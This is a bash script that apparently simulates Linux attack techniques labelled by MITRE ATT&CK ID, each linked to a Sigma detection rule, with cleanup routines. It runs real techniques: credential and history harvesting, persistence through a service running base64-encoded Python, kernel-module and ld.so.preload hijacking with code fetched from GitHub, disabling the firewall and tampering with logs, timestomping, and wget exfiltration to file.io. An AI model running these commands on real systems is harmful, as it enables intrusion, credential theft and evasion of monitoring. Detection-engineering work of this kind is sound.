#!/bin/bash


# Packet Capture Linux
# Sigma Rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_network_sniffing.yml
function T1040() {
  echo -e "\n Network Sniffing \n"
  interface="ens18"
  tcpdump="tcpdump -c 5 -nnni "${interface}
  tshark="tshark -c 5 -i "${interface}
  if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v tshark)" ]; then sudo $tcpdump & sudo $tshark; else sudo $tcpdump; fi;
}



# Data Compressed - T1560.001 - Archive via Utility
# Sigma Rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_data_compressed.yml
function T1560-001() {
  ### Data Compressed - Linux - zip multiple files
  echo -e "\n Data Compression \n"
  mkdir -p "/tmp/.T1560-001/"
  USERINF="/tmp/.T1560-001/users.txt"
  SECINF="/tmp/.T1560-001/security.txt"
  input_files="/tmp/.T1560-001/*"
  output_zip="$HOME/loot.zip"
  echo "Whoami:" >> $USERINF && whoami >> $USERINF
  echo "Current User Activity:" >> $USERINF && w >> $USERINF 2> /dev/null
  echo "Sudo Privs" >> $USERINF && sudo -l -n >> $USERINF 2> /dev/null
  echo "Sudoers" >> $USERINF && cat /etc/sudoers >> $USERINF 2> /dev/null
  echo "Last:" >> $USERINF && last >> $USERINF 2> /dev/null
  if [ $(ls ${input_files} | wc -l) > 0 ] && [ -x $(which zip) ] ; then zip ${output_zip} ${input_files}; else echo "zip not available"; fi;
  ### Data Compressed - Linux - gzip Single File
  input_file="$HOME/victim-gzip.txt"
  test -e ${input_file} && gzip -k ${input_file} || (echo "confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101" >> ${input_file}; gzip -k ${input_file})
  ### Data Compressed - Linux - tar Folder or File
  input_file_folder="$HOME"
  output_tar="$HOME/loot.tar.gz"
  tar -cvzf ${output_tar} ${input_file_folder}
}

function Cleanup_T1560-001() {
  echo -e "\n Cleanup - Data Compression \n"
  ### Data Compressed - Linux - zip multiple files
  input_files="/tmp/.T1560-001/"
  output_zip="$HOME/loot.zip"
  rm -rf ${input_files}
  rm -f ${output_zip}
  ### Data Compressed - Linux - gzip Single File
  input_file="$HOME/victim-gzip.txt"
  test -e ${input_file} && input_file="$HOME/victim-gzip.txt"
  rm -f ${input_file}.gz
  ### Data Compressed - Linux - tar Folder or File
  output_tar="$HOME/loot.tar.gz"
  rm -f ${output_tar}
}




# T1543.002 - Systemd Service
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_systemd_service_creation.yml
function T1543-002() {
  echo -e "\n Create Systemd Service \n"
  systemd_service_path="/etc/systemd/system"
  systemd_service_file="T1543-payback-systemd-service.service"
  execstoppost_action="/bin/touch /tmp/T1543-002/T1543-systemd-execstoppost-marker"
  execreload_action="/bin/touch /tmp/T1543-002/T1543-systemd-execreload-marker"
  execstart_action="/bin/touch /tmp/T1543-002/T1543-systemd-execstart-marker"
  execstop_action="/bin/touch /tmp/T1543-002/T1543-systemd-execstop-marker"
  execstartpre_action="/bin/touch /tmp/T1543-002/T1543-systemd-execstartpre-marker"
  execstartpost_action="/bin/touch /tmp/T1543-002/T1543-systemd-execstartpost-marker"
  echo "[Unit]" > ${systemd_service_path}/${systemd_service_file}
  echo "Description=Atomic Red Team Systemd Service" >> ${systemd_service_path}/${systemd_service_file}
  echo "" >> ${systemd_service_path}/${systemd_service_file}
  echo "[Service]" >> ${systemd_service_path}/${systemd_service_file}
  echo "Type=simple"
  echo "ExecStart=${execstart_action}" >> ${systemd_service_path}/${systemd_service_file}
  echo "ExecStartPre=${execstartpre_action}" >> ${systemd_service_path}/${systemd_service_file}
  echo "ExecStartPost=${execstartpost_action}" >> ${systemd_service_path}/${systemd_service_file}
  echo "ExecReload=${execreload_action}" >> ${systemd_service_path}/${systemd_service_file}
  echo "ExecStop=${execstop_action}" >> ${systemd_service_path}/${systemd_service_file}
  echo "ExecStopPost=${execstoppost_action}" >> ${systemd_service_path}/${systemd_service_file}
  echo "" >> ${systemd_service_path}/${systemd_service_file}
  echo "[Install]" >> ${systemd_service_path}/${systemd_service_file}
  echo "WantedBy=default.target" >> ${systemd_service_path}/${systemd_service_file}
  systemctl daemon-reload
  systemctl enable ${systemd_service_file}
  systemctl start ${systemd_service_file}

# Create Systemd Service file, Enable the service , Modify and Reload the service.
cat > /etc/init.d/T1543.002 << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides: Test T1543.002
# Required-Start: $all
# Required-Stop :
# Default-Start: 2 3 4 5
# Default-Stop:
# Short Description: Test for Systemd Service Creation
### END INIT INFO
python3 -c "import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIFRlc3QgZm9yIENyZWF0aW5nIFN5c3RlbWQgU2VydmljZSBUMTU0My4wMDIgPiAvdG1wL1QxNTQzLTAwMi9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJyk='))"
EOF

  chmod +x /etc/init.d/T1543.002
  if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then chkconfig T1543.002 on ; else echo "Please run this test on Ubnutu , kali OR centos" ; fi ;
  systemctl enable T1543.002
  systemctl start T1543.002

  echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIFRlc3QgZm9yIE1vZGlmeWluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My0wMDIvVDE1NDMuMDAyLnN5c3RlbWQuc2VydmljZS5tb2RpZmljYXRpb24nKQ=='))\"" | sudo tee -a /etc/init.d/T1543.002
  systemctl daemon-reload
  systemctl restart T1543.002
}

## Cleanup - Create Systemd Service
function Cleanup_T1543-002() {
  echo -e "\n Cleanup - Created Systemd Service \n"
  systemd_service_path="/etc/systemd/system"
  systemd_service_file="T1543-payback-systemd-service.service"
  systemctl stop ${systemd_service_file}
  systemctl disable ${systemd_service_file}
  tmp_local="/tmp/T1543-002"
  rm -rf ${systemd_service_path}/${systemd_service_file}
  if [ -d ${tmp_local} ]; then rm -r ${tmp_local}; fi;
  systemctl daemon-reload

  ### Create Systemd Service file, Enable the service , Modify and Reload the service.
  systemctl stop T1543.002
  systemctl disable T1543.002
  rm -rf /etc/init.d/T1543.002
  systemctl daemon-reload
}





# Recon - T1033 - System Owner/User Discovery
# Sigma Rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_user_discovery.yml
function T1033() {
  users
  w
  who
}




# T1082 - System Information Discovery
# Sigma Rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_system_info_discovery2.yml
function T1082() {
  # List OS Information
  echo -e "\n Collecting OS/Host Information \n"
  mkdir -p "/tmp/.T1082/"
  OSINFO="/tmp/.T1082/T1082.txt"
  uname -a >> ${OSINFO}
  if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> ${OSINFO}; fi;
  if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> ${OSINFO}; fi;
  if [ -f /etc/issue ]; then cat /etc/issue >> ${OSINFO}; fi;
  echo "uptime: " >> ${OSINFO} && uptime >> ${OSINFO}
  echo "Hostname: " >> ${OSINFO} && hostname >> ${OSINFO}
  env >> ${OSINFO}
  cat ${OSINFO} 2>/dev/null

  # Linux VM Check via Hardware
  if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi;
  if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi;
  if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi;
  if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi;
  if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi;
  if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi;
  if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi;
  if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi;

  # Linux VM Check via Kernel Modules
  sudo lsmod | grep -i "vboxsf\|vboxguest"
  sudo lsmod | grep -i "vmw_baloon\|vmxnet"
  sudo lsmod | grep -i "xen-vbd\|xen-vnif"
  sudo lsmod | grep -i "virtio_pci\|virtio_net"
  sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
}
function Cleanup_T1082() {
  echo -e "\n Cleanup - Collected OS/Host Information \n"
  out_local="/tmp/.T1082/"
  if [ -d ${out_local} ]; then rm -r ${out_local} 2>/dev/null; fi;
}






# T1552.003 - Bash History
# Sigma Rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_susp_histfile_operations.yml
function T1552-003() {
  echo -e "\n [+] Searching Bash History Sensitive Information \n"
  bash_output_file=~/loot.txt
  bash_history_filename=~/.bash_history
  cat ${bash_history_filename} | grep -e '-p ' -e 'pass' -e 'ssh' >> ${bash_output_file}
}




# T1059.004 - Create and Execute Bash Shell Script
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_susp_cmds.yml
function T1059-004() {
  echo -e "\n [+] creating and executing bash script \n"
  bash_script_path="/tmp/payme.sh"
  sh -c "echo 'echo Hello from T1059-004' > ${bash_script_path}"
  sh -c "echo 'ping -c 4 8.8.8.8' >> ${bash_script_path}"
  chmod u+s ${bash_script_path}
  sh ${bash_script_path}
}
function Cleanup_T1059-004() {
  echo -e "\n [+] Cleanup - deleting created bash script \n"
  bash_script_path="/tmp/payme.sh"
  rm -rf ${bash_script_path}
}





# T1030 - Data Transfer Size Limits
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_split_file_into_pieces.yml
function T1030() {
  echo -e "\n [+] Spliting files into small parts \n"
  file_name="T1030_urandom"
  folder_path="/tmp/T1030"
  if [ ! -d ${folder_path} ]; then mkdir -p ${folder_path}; touch ${folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=${folder_path}/${file_name} bs=25000000 count=1
  if [ -f ${folder_path}/${file_name} ]; then cd ${folder_path}; split -b 5000000 ${file_name}; fi;
  ls -l ${folder_path}
}
function Cleanup_T1030() {
  echo -e "\n [+] Cleanup - Reverting Changes \n"
  folder_path="/tmp/T1030"
  if [ -f ${folder_path}/safe_to_delete ]; then rm -r ${folder_path}; fi;
}




# T1201 - Password Policy Discovery
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_password_policy_discovery.yml
function T1201() {
  echo -e "\n [+] Checking Password Policies \n"
  # Password policy discovery via files
  # Examine password complexity policy - Ubuntu/All Linux/CentOS/RHEL 6/7.x
  if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then cat /etc/pam.d/common-password; cat /etc/login.defs; elif [ $(rpm -q --queryformat '%{VERSION}') -eq "6" ]; then cat /etc/pam.d/system-auth && cat /etc/security/pwquality.conf; elif [ $(rpm -q --queryformat '%{VERSION}') -eq "7" ]; then cat /etc/security/pwquality.conf; else echo "Please run from CentOS or RHEL v6"; fi;

  # Password policy discovery via commands
  chage --list
  passwd -S
}




# T1046 - Network Service Scanning
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_network_service_scanning.yml
function T1046() {
  echo -e "\n [+] Initiating Port Scan \n"
  # Port via script
  for port in {80,443};
  do
    echo >/dev/tcp/192.168.11.114/$port && echo "port $port is open" || echo "port $port is closed" : ;
  done

  # Port Scan Nmap/nc/telnet
  network_range="192.168.11.0/24"
  target_port="22"
  target_host="192.168.11.110"
  if [ -x "$(command -v telnet)" ]; then telnet ${target_host} ${target_port}; else echo "telnet not available"; fi;
  if [ -x "$(command -v nc)" ]; then nc -nv ${target_host} ${target_port}; else echo "nc not available"; fi;
  if [ -x "$(command -v nmap)" ]; then nmap -sS ${network_range} -p ${target_port}; else echo "nmap not available"; fi;
}




#T1036.003 - Rename System Utilities
# Sigma Rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_masquerading_crond.yml
function T1036-003() {
  echo -e "\n [+] Masquerading as Linux crond process \n"
  cp -i /bin/sh /tmp/crond;
  echo 'sleep 5' | /tmp/crond
}
function Cleanup_T1036-003() {
  echo -e "\n [+] Cleanup - Deleting masqueraded process \n"
  rm /tmp/crond
}




# T1562.006 - Indicator Blocking
# Sigma Rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_logging_config_change.yml
function T1562-006() {
  # Auditing Configuration Changes on Linux Host
  echo -e "\n [+] Performing auditing config changing \n"
  audisp_config_file_name="audispd.conf"
  auditd_config_file_name="auditd.conf"
  libaudit_config_file_name="libaudit.conf"
  sed -i '$ a #art_test_1562_006_1' /etc/audisp/${audisp_config_file_name}
  if [ -f "/etc/auditd.conf" ]; then sed -i '$ a #art_test_1562_006_1' /etc/${auditd_config_file_name}; else sed -i '$ a #art_test_1562_006_1' /etc/audit/${auditd_config_file_name}; fi;
  sed -i '$ a #art_test_1562_006_1' /etc/${libaudit_config_file_name}

  # Logging Configuration Changes on Linux Host
  echo -e "\n [+] Performing logging config changes\n"
  syslog_config_file_name="syslog.conf"
  rsyslog_config_file_name="rsyslog.conf"
  syslog_ng_config_file_name="syslog-ng.conf"
  if [ -f "/etc/${syslog_config_file_name}" ]; then sed -i '$ a #art_test_1562_006_2' /etc/${syslog_config_file_name}; fi;
  if [ -f "/etc/${rsyslog_config_file_name}" ]; then sed -i '$ a #art_test_1562_006_2' /etc/${rsyslog_config_file_name}; fi;
  if [ -f "/etc/syslog-ng/${syslog_ng_config_file_name}" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/${syslog_ng_config_file_name}; fi;
}

function Cleanup_T1562-006() {
  # Auditing Configuration Changes on Linux Host
  echo -e "\n [+] Cleanup - Reverting auditing config changes\n"
  audisp_config_file_name="audispd.conf"
  auditd_config_file_name="auditd.conf"
  libaudit_config_file_name="libaudit.conf"
  sed -i '$ d' /etc/audisp/${audisp_config_file_name}
  if [ -f "/etc/$auditd_config_file_name}" ]; then sed -i '$ d' /etc/${auditd_config_file_name}; else sed -i '$ d' /etc/audit/${auditd_config_file_name}; fi;
  sed -i '$ d' /etc/${libaudit_config_file_name}

  # Logging Configuration Changes on Linux Host
  echo -e "\n [+] Cleanup - Reverting logging config changes\n"
  syslog_config_file_name="syslog.conf"
  rsyslog_config_file_name="rsyslog.conf"
  syslog_ng_config_file_name="syslog-ng.conf"
  if [ -f "/etc/${syslog_config_file_name}" ]; then sed -i '$ d' /etc/${syslog_config_file_name}; fi;
  if [ -f "/etc/${rsyslog_config_file_name}" ]; then sed -i '$ d' /etc/${rsyslog_config_file_name}; fi;
  if [ -f "/etc/syslog-ng/${syslog_ng_config_file_name}" ]; then sed -i '$ d' /etc/syslog-ng/${syslog_ng_config_file_name}; fi;
}




# T1547.006 - Kernel Modules and Extensions
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_load_module_insmod.yml
function T1547-006() {
  echo -e "\n [+] Loading Kernel module via insmod \n"
  temp_folder="/tmp/T1547.006"
  module_source_p1="https://raw.githubusercontent.com/greycel/Linux-Attack-Detections/main/Atomic_Chains/src/T1547.006/Makefile"
  module_source_p2="https://raw.githubusercontent.com/greycel/Linux-Attack-Detections/main/Atomic_Chains/src/T1547.006/T1547006.c"
  module_name="T1547006"
  module_path="/tmp/T1547.006/T1547006.ko"

  if [ ! -d ${temp_folder} ]; then mkdir -p ${temp_folder}; touch ${temp_folder}/safe_to_delete; fi;
  wget -q -O ${temp_folder}/Makefile ${module_source_p1}
  wget -q -O ${temp_folder}/T1547006.c ${module_source_p2}
  cd ${temp_folder}; make
  if [ ! -f ${module_path} ]; then mv ${temp_folder}/${module_name}.ko ${module_path}; fi;
  sudo insmod ${module_path}
}
function Cleanup_T1547-006() {
  echo -e "\n [+] Cleanup - Removing Kernel module \n"
  temp_folder="/tmp/T1547.006"
  module_name="T1547006"
  sudo rmmod ${module_name}
  [ -f ${temp_folder}/safe_to_delete ] && rm -rf ${temp_folder}
}




# T1574.006 - Dynamic Linker Hijacking
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_ld_so_preload_mod.yml
function T1574-006() {
  echo -e "\n [+] Loading Kernel module via insmod \n"
  temp_folder="/tmp/T1574.006"
  shared_library_source="https://raw.githubusercontent.com/greycel/Linux-Attack-Detections/main/Atomic_Chains/src/T1574.006/T1574.006.c"
  path_to_shared_library_src_local="/tmp/T1574.006/T1574.006.c"
  path_to_shared_library="/tmp/T1574.006/T1574006.so"
  if [ -x "$(command -v gcc)" ];
  then
    if [ ! -d ${temp_folder} ]; then mkdir -p ${temp_folder}; touch ${temp_folder}/safe_to_delete; fi;
    curl -fsSL ${shared_library_source} -O ${path_to_shared_library_src_local}
    gcc -shared -fPIC -o ${path_to_shared_library} ${path_to_shared_library_src_local}
    if [ -f ${path_to_shared_library} ]; then sudo sh -c 'echo ${path_to_shared_library} > /etc/ld.so.preload'; fi;
  else echo "something went wrong"; fi;

  # Shared Library Injection via LD_PRELOAD
  echo -e "\n [+] Shared Library Injection via LD_PRELOAD \n"
    LD_PRELOAD=${path_to_shared_library} ls
}

function Cleanup_T1574-006() {
  echo -e "\n [+] Cleanup - Unload loaded kernel module \n"
  temp_folder="/tmp/T1574.006"
  path_to_shared_library="/tmp/T1574.006/T1574006.so"
  sudo sed -i '\~${path_to_shared_library}~d' /etc/ld.so.preload
  if [ -f ${temp_folder}/safe_to_delete ]; then rm -r ${temp_folder}; fi;
}




# T1564.001 - Hidden Files and Directories
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_hidden_files_directories.yml
function T1564-001() {
  echo -e "\n [+] Creating hidden files and directories \n"
  mkdir /var/tmp/.hidden-directory
  echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
}
function Cleanup_T1564-001() {
  echo -e "\n [+] Cleanup - Deleting created hidden files and directories \n"
  rm -rf /var/tmp/.hidden-directory/
}




# T1552.001 - Credentials In Files
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_find_cred_in_files.yml
function T1552-001() {
  echo -e "\n [+] Looking for sensitive info in files \n"
  # Extract passwords with grep
  file_path="/etc/passwd"
  grep -ri password ${file_path}
  # Find and Access Github Credentials in ".netrc" file
  for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
}




# T1222.002 - Linux and Mac File and Directory Permissions Modification
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_file_or_folder_permissions.yml
function T1222-002() {
  echo -e "\n [+] Changing file or folder permissions \n"
  numeric_mode="755"
  symbolic_mode="a+w"
  group="blusapphire"
  owner="blusapphire"
  folder="/tmp/T1222.002"
  file="/tmp/T1222.002/T1222.sh"
  if [ ! -d ${folder} ]; then mkdir -p ${folder}; touch ${folder}/safe_to_delete; echo "curl ipinfo.io/ip" > ${file}; fi;
  chmod ${premission} ${folder}
  chmod ${symbolic_mode} ${folder}
  chmod -R ${numeric_mode} ${folder}
  chmod -R ${symbolic_mode} ${folder}
  chown ${owner}:${group} ${file}
  chattr -i ${file}
}
function Cleanup_T1222-002() {
  echo -e "\n [+] Cleanup - deleting created files and folders \n"
  folder="/tmp/T1222.002"
  if [ -d ${folder} ]; then rm -rf ${folder}; fi;
}




# T1562.004 - Disable or Modify System Firewall
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_disable_system_firewall.yml
function T1562-004() {
  echo -e "\n [+] Disable or Modify System Firewall & logging \n";
  if [ ! -x "$(command -v ufw)" ]; then echo -e "\n***** ufw NOT installed *****\n";
  elif echo "$(ufw status)" | grep -q "inactive"; then  echo -e "\n***** ufw inactive *****";
else echo -e "\n Disabling UFW firewall \n"; sudo ufw disable; sudo ufw logging off; fi

  #  Stop/Start UFW firewall via systemctl
  if [ ! -x "$(command -v systemctl)" ]; then echo -e "\n***** systemctl NOT installed *****\n";
  elif [ ! -x "$(command -v ufw)" ]; then echo -e "\n***** ufw NOT installed *****\n";
  elif echo "$(ufw status)" | grep -q "inactive"; then  echo -e "\n***** ufw inactive *****";
  else echo -e "\n Disabling UFW firewall \n"; sudo systemctl stop ufw; fi
}
function Cleanup_T1562-004() {
  echo -e "\n [+] Cleanup - Enabling UFW firewall & logging \n"
  if [ ! -x "$(command -v ufw)" ]; then echo -e "\n***** ufw NOT installed *****\n";
  elif echo "$(ufw status)" | grep -q "inactive"; then echo -e "\n Enabling UFW firewall \n"; sudo ufw enable; sudo ufw logging low; sudo ufw status verbose; fi

  if [ ! -x "$(command -v systemctl)" ]; then echo -e "\n***** systemctl NOT installed *****\n";
  elif [ ! -x "$(command -v ufw)" ]; then echo -e "\n***** ufw NOT installed *****\n";
  elif  echo "$(ufw status)" | grep -q "inactive"; then echo -e "\n Enabling UFW firewall \n"; sudo systemctl start ufw; sudo systemctl status ufw; fi

}




# T1546.004 - Unix Shell Configuration Modification
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_alter_bash_profile.yml
function T1546-004() {
  echo -e "\n [+] Modifing .bash_profile and .bashrc profiles [T1546-004] \n"
  command_to_add='echo "Hello from Bash_Profile - T1546.004"'
  echo "${command_to_add}" >> ~/.bash_profile
  echo "${command_to_add}" >> ~/.bashrc
}
function Cleanup_T1546-004() {
  echo -e "\n [+] Reverting .bash_profile and .bashrc profiles [T1546-004] \n"
  sed -i '/echo "Hello from Bash_Profile - T1546.004"/d' ~/.bash_profile
  sed -i '/echo "Hello from Bash_Profile - T1546.004"/d' ~/.bashrc
}



# T1485 - Data Destruction - Overwriting the File with Dev Zero or Null
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_dd_delete_file.yml
function T1485() {
  # Linux - Overwrite file with DD
  echo -e "\n [+] Overwriting the File with Dev Zero or Null [T1485] \n"
  overwrite_source="/dev/zero"
  file_to_overwrite="/var/log/T1485"
  if [ ! -f ${file_to_overwrite} ]; then echo "Hello from T1485..!" > ${file_to_overwrite}; fi;
  dd if=${overwrite_source} of=${file_to_overwrite} count=$(ls -l ${file_to_overwrite} | awk '{print $5}') iflag=count_bytes
}
function Cleanup_T1485(){
  echo -e "\n [+] Cleanup - Deleting files [T1485] \n"
  file_to_overwrite="/var/log/T1485"
  if [ -f ${file_to_overwrite} ]; then rm ${file_to_overwrite}; fi;
}



# TA0010 - Exfiltration
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_data_exfil_wget.yml
function TA0010() {
  echo -e "\n [+] Simulating Exfil viw wget [TA0010] \n"
  upload_url="https://www.file.io/"
  local_file="/var/log/TA0010"
  if [ ! -f ${local_file} ]; then echo "Hello from Exfil [TA0010]..!" > ${local_file}; fi;
  wget --post-file=${local_file} ${upload_url}
}
function Cleanup_TA0010(){
  echo -e "\n [+] Cleanup - Deleting files [TA0010] \n"
  local_file="/var/log/TA0010"
  if [ -f ${local_file} ]; then rm ${local_file}; fi;
}




# T1136 - Create Account
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_create_account.yml
function T1136() {
  echo -e "\n [+] Creating Account Creation [T1136] \n"
  useradd root
}




# T1070.006 - Timestomp
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_change_file_time_attr.yml
function T1070-006() {
  echo -e "\n [+] Simulating Timestomping \n"
  file_to_Timestomp="/var/log/T1070.006"
  NOW=$(date)
  if [ ! -f ${file_to_Timestomp} ]; then echo "Hello from T1070.006..! - $NOW" > ${file_to_Timestomp}; fi;
  # Set a file's access timestamp
  touch -a -t 197001010000.00 ${file_to_Timestomp}
  # Set a file's modification timestamp
  touch -m -t 197001010000.00 ${file_to_Timestomp}
  # Set a file's creation timestamp
  date -s "1970-01-01 00:00:00"
  touch ${file_to_Timestomp}
  date -s "$NOW"
  stat ${file_to_Timestomp}
  # Modify file timestamps using reference file
  reference_file_path="/bin/sh"
  touch -acmr ${reference_file_path} ${file_to_Timestomp}
}
function Cleanup_T1070-006() {
  echo -e "\n [+] Cleanup - Deleting timestomped file \n"
  file_to_Timestomp="/var/log/T1070.006"
  if [ -f ${file_to_Timestomp} ]; then rm ${file_to_Timestomp}; fi;
}





# T1123 - Linux Capabilities Discovery
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_capabilities_discovery.yml
function T1123() {
  echo -e "\n [+] Linux Capabilities Discovery \n"
  #getcap -r /  # Generates high volume of events
  getcap /usr/bin/mtr-packet
}




# T1027.001- Binary Padding
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_binary_padding.yml
function T1027-001() {
  echo -e "\n [+] Binary Padding \n"
  file_for_padding="/tmp/T1027.001"
  if [ ! -f ${file_for_padding} ]; then cp /bin/ls ${file_for_padding}; fi;
  dd if=/dev/zero bs=1 count=1 >> ${file_for_padding}
}
function Cleanup_T1027-001() {
  echo -e "\n [+] Cleanup - Removing Binary \n"
  file_for_padding="/tmp/T1027.001"
  rm ${file_for_padding}
}




# Possible Coin Miner CPU Priority Param
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_coinminer.yml
function miner() {
  echo -e "\n [+] Simulating Coin Miner Command \n"
  nc --cpu-priority --cpu-priority --cpu-priority
}




# T1113 - Screen Capture
# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_screencaputre_xwd.yml
function T1113() {
  echo -e "\n [+] Capturing screenshots \n"
  # Using X Windows Capture
  output_xwd_capture="/tmp/T1113_xwd_capture.xwd"
  if [ ! -x "$(command -v xwd)" ]; then echo "x11-apps not available"; else xwd -root -out ${output_xwd_capture} && xwud -in ${output_xwd_capture}; fi;

  # Capture Linux Desktop using Import Tool
  output_import_capture="/tmp/T1113_import_capture.png"
  if import -help > /dev/null 2>&1; then echo "Package not available"; else import -window root ${output_import_capture}; fi
}
function Cleanup_T1113() {
  echo -e "\n [+] Cleanup - Deleting captured screens \n"
  # Cleanup - Deleting captured screenshots
  output_xwd_capture="/tmp/T1113_xwd_capture.xwd"
  output_import_capture="/tmp/T1113_import_capture.png"
  rm -rf $output_xwd_capture $output_import_capture
}




# T1027-003 - Steganography Extract Files with Steghide
# Sigma Rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_steghide_extract_steganography.yml
function T1027-003() {
  echo -e "\n [+] Extracting file from Image \n"
  download_path="/tmp/T1027.jpg"
  wget -O ${download_path} "https://github.com/greycel/Linux-Attack-Detections/blob/main/T1027/T1027.jpg"
  steghide extract -sf ${download_path} -p test -q
  /tmp/out.sh
}
function Cleanup_T1027-003() {
  echo -e "\n [+] Cleanup - Deleting extrcted files \n"
  rm -rf "/tmp/T1027.jpg"
  rm -rf "/tmp/out.sh"
}




####################################################
### Simulation Mods
####################################################
T1040		# Network-Sniffing
T1560-001	# Data-Compression
T1543-002	# Create-Systemd-Service
T1033		# System Owner/User Discovery
T1082		# System Information Discovery
T1552-003	# Bash History
T1059-004	# Create and Execute Bash Shell Script
T1030		# Data Transfer Size Limits
T1201		# Password Policy Discovery
T1046		# Network Service Scanning
T1036-003 	# Rename System Utilities
T1562-006	# Indicator Blocking
T1547-006   	# Kernel Modules and Extensions
T1574-006   	# Dynamic Linker Hijacking
T1564-001   	# Hidden Files and Directories
T1552-001   	# Credentials In Files
T1222-002	# Linux and Mac File and Directory Permissions Modification
T1562-004	# Disable or Modify System Firewall
T1546-004	# Unix Shell Configuration Modification
T1485		# Data Destruction
TA0010		# Exfiltration
T1136		# Create Account
T1070-006	# Timestomp
T1123		# Linux Capabilities Discovery
T1027-001	# Binary Padding
miner		# Command simulation
#T1113		# Screen Capture
#T1027-003	# Obfuscated Files - Steganography


sleep 2m


####################################################
### Cleanup Mods
####################################################
Cleanup_T1560-001	# Data-Compression
Cleanup_T1543-002	# System Owner/User Discovery
Cleanup_T1082		# System Information Discovery
Cleanup_T1059-004 	# Create and Execute Bash Shell Script
Cleanup_T1030		# Data Transfer Size Limits
Cleanup_T1036-003 	# Rename System Utilities
Cleanup_T1562-006	# Indicator Blocking
Cleanup_T1547-006    	# Kernel Modules and Extensions
Cleanup_T1574-006   	# Dynamic Linker Hijacking
Cleanup_T1564-001   	# Hidden Files and Directories
Cleanup_T1222-002	# Linux and Mac File and Directory Permissions Modification
Cleanup_T1562-004	# Disable or Modify System Firewall
Cleanup_T1546-004	# Unix Shell Configuration Modification
Cleanup_T1485		# Data Destruction
Cleanup_TA0010		# Exfiltration
Cleanup_T1070-006	# Timestomp
Cleanup_T1027-001	# Binary Padding
#Cleanup_T1113		# Screen Capture
#Cleanup_T1027-003	# Obfuscated Files or Information: Steganography







